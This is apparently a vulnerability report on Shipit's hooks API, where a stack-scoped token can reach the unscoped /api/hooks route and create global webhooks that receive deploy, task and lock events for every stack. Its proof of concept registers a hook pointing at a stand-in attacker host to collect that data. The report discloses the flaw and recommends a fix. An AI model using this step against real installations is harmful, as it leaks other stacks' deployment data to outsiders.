### Title
Stack-scoped API token can create/manage global webhooks that leak deploy/task/lock state for every stack - (File: `app/controllers/shipit/api/hooks_controller.rb`)

### Summary
An `ApiClient` can be scoped to a single `Stack` via its `stack_id` column, and the base API controller is supposed to enforce that scope for every resource the token touches. `HooksController`, however, derives its scope purely from the URL (`params[:stack_id]`), not from the authenticated token's own `stack_id`. When a stack-scoped token calls the top-level, unscoped `/api/hooks` collection instead of the nested `/api/stacks/:stack_id/hooks` collection, it operates on **global** hooks (`stack_id: nil`) which are delivered for every stack in the installation, not just the one the token was authorized for.

### Finding Description
`ApiClient#stack_id` is the binding that is supposed to equal the `Stack` the token may act on: `stacks` in `app/controllers/shipit/api/base_controller.rb:74-76` restricts `Stack.where(id: current_api_client.stack_id)` whenever `current_api_client.stack_id?` is true. [1](#0-0) 

`HooksController`, however, never consults `current_api_client.stack_id` at all. Its scoping is entirely path-driven: [2](#0-1) 

`config/routes.rb` exposes two separate collections for hooks: a nested one under a specific stack, and an unscoped, top-level one that is reachable by any authenticated `ApiClient` (including a stack-scoped one), independent of that client's own `stack_id`: [3](#0-2) 

Because `HooksController#stack_id` only looks at `params[:stack_id].present?` (i.e., whether the *route* is the nested one), a request to the top-level `/api/hooks` endpoint always resolves `stack_id` to `nil`, regardless of what stack the authenticating `ApiClient` is bound to. The `hooks` scope therefore becomes `Hook.where(stack_id: nil)` — the set of **global** hooks — with no check that the token's own `stack_id` binding permits acting outside its stack.

The permission model (`read:hook`/`write:hook`) is also stack-agnostic — `ApiClient::PERMISSIONS` treats `read:hook`/`write:hook` as flat capabilities with no per-stack qualifier: [4](#0-3) 

`Hook.emit`/`Hook.deliver` fan out events (`stack`, `task`, `deploy`, `rollback`, `lock`, `commit_status`, `merge`, `merge_status`, `pull_request`, etc.) to any hook whose `stack_id` matches the emitting stack **or is `nil`** (global), via `Hook.for_stack`: [5](#0-4) 

The equality that should hold is `token.stack_id == hook.stack_id` for every hook the token creates/reads/updates/destroys. The actual behavior on the unscoped route is `hook.stack_id == nil` unconditionally, which is a strictly *broader* set than `{token.stack_id}` whenever the token is stack-scoped — it can create/read/manage hooks that will receive events for every other stack in the deployment, including ones it has no other access to.

### Impact Explanation
A hook delivery payload for `deploy`/`rollback`/`task`/`lock`/`merge` events includes stack/task metadata (repository, environment, branch, commit SHAs, deploy URLs, and status) for *any* stack in the installation, because global hooks are delivered for all stacks (`Hook.for_stack` matches `stack_id: [nil, stack_id]`). A holder of a token that was only meant to be scoped to one stack (e.g., a CI integration or a third-party service token issued for a single application) can, if the admin also granted it `write:hook`/`read:hook`, register (or read the delivery URL of) a global hook and start receiving state/output events for every stack it should have had no access to — an unauthenticated (relative to other stacks) read of stack state/task output across repositories the token was never authorized for. This maps to the "High — unauthenticated read of stack state, task streams or deploy output" impact bucket, since it crosses the `token.stack_id` vs. `hook.stack_id` boundary that the rest of the API (e.g. `StacksController`) is careful to enforce.

### Likelihood Explanation
This requires possession of a valid `ApiClient` token that is scoped to a stack but was also granted `write:hook`/`read:hook` permission — a combination an operator could plausibly configure (e.g., "let this integration manage its own webhooks"), believing the `stack_id` scoping restricts it to that one stack, as it does for every other resource (`stacks`, `tasks`, `deploys`, `commits`, `merge_requests`). No privilege escalation beyond the existing token is required; the attacker simply calls `/api/hooks` instead of `/api/stacks/:id/hooks`.

### Recommendation
In `HooksController`, intersect the requested scope with the authenticated client's own binding: if `current_api_client.stack_id?`, restrict `hooks` to `Hook.where(stack_id: current_api_client.stack_id)` regardless of the URL used, and reject (404/403) any attempt by a stack-scoped client to reach the global hooks collection. Equivalently, route hook access through the same `stacks`/`stack` helpers already used by `StacksController` so the `token.stack_id == hook.stack_id` binding is enforced uniformly.

### Proof of Concept
1. Create an `ApiClient` scoped to `Stack A` (`stack_id: A.id`) with permissions `['read:hook', 'write:hook']` (an admin might do this expecting it to only manage `Stack A`'s hooks).
2. Authenticate as that client and `POST /api/hooks` (the unscoped collection, not `/api/stacks/:A/hooks`) with `{ delivery_url: "https://attacker.example/collect", events: ["deploy", "rollback", "task", "lock", "merge"] }`.
3. `HooksController#stack_id` evaluates to `nil` because `params[:stack_id]` is absent on this route, so the hook is created with `stack_id: nil` — a global hook.
4. Any deploy, rollback, task, or lock event on any other stack in the installation (`Stack B`, `Stack C`, …) is now delivered to `https://attacker.example/collect`, even though the token was only ever authorized for `Stack A`.

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
